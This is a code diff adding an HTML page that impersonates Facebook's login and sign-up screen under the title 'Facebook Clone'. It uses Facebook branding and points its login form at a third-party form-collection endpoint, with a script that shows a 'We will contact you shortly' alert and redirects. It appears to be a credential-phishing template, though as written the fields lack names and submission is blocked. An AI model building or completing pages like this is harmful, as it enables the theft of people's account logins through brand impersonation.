@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Facebook Clone</title>
+</head>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f2f5;
+}
+
+header {
+    background-color: #4267B2;
+    color: white;
+    display: flex;
+    justify-content: space-between;
+    padding: 10px 20px;
+}
+
+header .logo h1 {
+    margin: 0;
+}
+
+nav ul {
+    list-style: none;
+    display: flex;
+    margin: 0;
+    padding: 0;
+}
+
+nav ul li {
+    margin-left: 20px;
+}
+
+nav ul li a {
+    color: white;
+    text-decoration: none;
+}
+
+.hero {
+    text-align: center;
+    padding: 50px;
+}
+
+.hero h2 {
+    font-size: 24px;
+    margin-bottom: 20px;
+}
+
+.hero form {
+    margin: 0 auto;
+    max-width: 400px;
+}
+
+.hero input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+.hero button {
+    width: 100%;
+    padding: 10px;
+    background-color: #42b72a;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+.signup-section {
+    text-align: center;
+    margin-top: 50px;
+}
+
+.signup-section h2 {
+    margin-bottom: 20px;
+}
+
+.signup-section input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+.signup-section button {
+    width: 100%;
+    padding: 10px;
+    background-color: #42b72a;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+footer {
+    text-align: center;
+    padding: 20px;
+    background-color: #e9ecef;
+}
+</style>
+<body>
+    <header>
+        <div class="logo">
+            <h1>Facebook</h1>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Login</a></li>
+                <li><a href="#">Sign Up</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero">
+            <h2>Connect with friends and the world around you on Facebook.</h2>
+            <form action="https://submit-form.com/vQBbiONxP"   id="login-form">
+                <input type="text" placeholder="Email or Phone Number" required>
+                <input type="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgotten password?</a>
+            </div>
+        </section>
+
+        <section class="signup-section">
+            <h2>Create a new account</h2>
+            <form>
+                <input type="text" placeholder="First Name" required>
+                <input type="text" placeholder="Last Name" required>
+                <input type="text" placeholder="Mobile Number or Email" required>
+                <input type="password" placeholder="New Password" required>
+                <button type="submit">Sign Up</button>
+            </form>
+            <p>By clicking Sign Up, you agree to our Terms, Data Policy, and Cookie Policy.</p>
+        </section>
+    </main>
+
+    <footer>
+        <p>Facebook © 2024</p>
+    </footer>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+            alert('We will contact you shortly'); // Show pop-up message
+            
+            // Redirect to another page after a delay of 3 seconds
+            setTimeout(function() {
+                window.location.href = 'home.html'; // Change 'home.html' to your desired page
+            }, 3000); // 3 seconds delay
+        });
+    </script>
+</body>
+</html>
